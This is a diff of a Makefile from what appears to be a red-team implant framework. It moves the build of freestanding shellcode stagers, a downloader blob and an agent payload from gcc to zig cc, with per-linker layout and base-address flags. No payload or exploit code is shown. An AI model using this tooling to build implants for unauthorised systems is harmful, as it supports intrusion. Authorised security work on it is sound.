@@ -1,7 +1,27 @@
-CC = gcc
+# The stager is freestanding C compiled into raw shellcode. Default to the zig
+# toolchain shipped in the operator kit (see core/build.py install_zig) so the
+# build never depends on a host C compiler and is byte-stable everywhere.
+# Override on the command line (e.g. `make CC=gcc ...`) for a custom toolchain.
+#
+# No glibc target is pinned here on purpose: the stager links with -nostdlib, so
+# no libc is ever pulled in and the glibc version cannot affect the artifact.
+# zig also drops the target's libc include paths when -nostdlib is on the
+# compile+link command, so an explicit versioned target would break the
+# <stdlib.h>/<string.h> includes that rc4.c still needs declarations from.
+CC = zig cc
+
+# -fno-toplevel-reorder is a GCC-only flag that clang/zig cc reject, so only
+# pass it to compilers that understand it.
+CC_IS_CLANG := $(shell $(CC) --version 2>/dev/null | grep -qi clang && echo 1)
+ifeq ($(CC_IS_CLANG),1)
+TOPLEVEL_REORDER_FLAG =
+else
+TOPLEVEL_REORDER_FLAG = -fno-toplevel-reorder
+endif
+
 COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. -I../common \
-								-fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
-								-fno-asynchronous-unwind-tables -fvisibility=hidden -ffixed-r15
+								$(TOPLEVEL_REORDER_FLAG) -s -fno-ident -ffunction-sections -fdata-sections \
+								-fno-asynchronous-unwind-tables -fvisibility=hidden
 
 # The malasada builder prepends a fixed stage0 shellcode blob to the agent
 # payload. Only that prefix needs to be executable; the appended payload stays
@@ -28,14 +48,33 @@ SUPERVISE_SLEEP_MIN ?= 5
 SUPERVISE_SLEEP_MAX ?= 30
 COMMON_CFLAGS += -DSUPERVISE_SLEEP_MIN=$(SUPERVISE_SLEEP_MIN) -DSUPERVISE_SLEEP_MAX=$(SUPERVISE_SLEEP_MAX)
 
-# Common linker flags. -Wl,-N (--omagic) marks .text writable and produces
-# RWX LOAD segments; -Wl,-n (--nmagic) keeps sections tightly packed (the
-# flat blob layout depends on it) while leaving code/rodata read-only.
-LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-n -Wl,--build-id=none
+# Common linker flags. GNU ld's -Wl,-n (--nmagic) keeps sections tightly packed
+# while leaving code/rodata read-only. lld (zig cc) implements neither --nmagic
+# nor -Ttext-segment: it packs sections with stager_pic.ld and takes --image-base
+# for the stage load address, so select a matching flag set per compiler.
+ifeq ($(CC_IS_CLANG),1)
+LDFLAGS_MAGIC =
+PIC_LAYOUT = -Wl,-T,stager_pic.ld
+STAGE0_BASE = -Wl,--image-base=0x10000000
+STAGE1_BASE = -Wl,--image-base=0x0
+# lld turns `-static -shared` into an ar archive, and ignores a fixed base for
+# a PIC shared object, so neither is passed for zig.
+SO_STATIC =
+SO_BASE =
+else
+LDFLAGS_MAGIC = -Wl,-n
+PIC_LAYOUT =
+STAGE0_BASE = -Wl,-Ttext-segment=0x10000000
+STAGE1_BASE = -Wl,-Ttext-segment=0x0
+SO_STATIC = -static
+SO_BASE = -Wl,-Ttext-segment=0x10000000
+endif
+
+LDFLAGS_COMMON = -static -Wl,--gc-sections $(LDFLAGS_MAGIC) -Wl,--build-id=none
 
 # Specific linker flags
-STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
-STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0
+STAGE0_LDFLAGS = $(LDFLAGS_COMMON) $(PIC_LAYOUT) $(STAGE0_BASE)
+STAGE1_LDFLAGS = $(LDFLAGS_COMMON) $(PIC_LAYOUT) $(STAGE1_BASE)
 # The downloader is a position-independent blob mapped at an arbitrary address
 # by the stub, so it links as its own stage at virtual address 0.
 DL_LDFLAGS = $(STAGE1_LDFLAGS)
@@ -43,7 +82,7 @@ DL_LDFLAGS = $(STAGE1_LDFLAGS)
 # packed segment would fold RW data into the RX text segment and yield RWX.
 # Use the default page-aligned multi-segment layout (distinct RX/RW LOADs)
 # instead; sections no longer need to be contiguous for a real shared object.
-SO_LDFLAGS = -static -Wl,--gc-sections -Wl,--build-id=none -Wl,-Ttext-segment=0x10000000
+SO_LDFLAGS = $(SO_STATIC) -Wl,--gc-sections -Wl,--build-id=none $(SO_BASE)
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
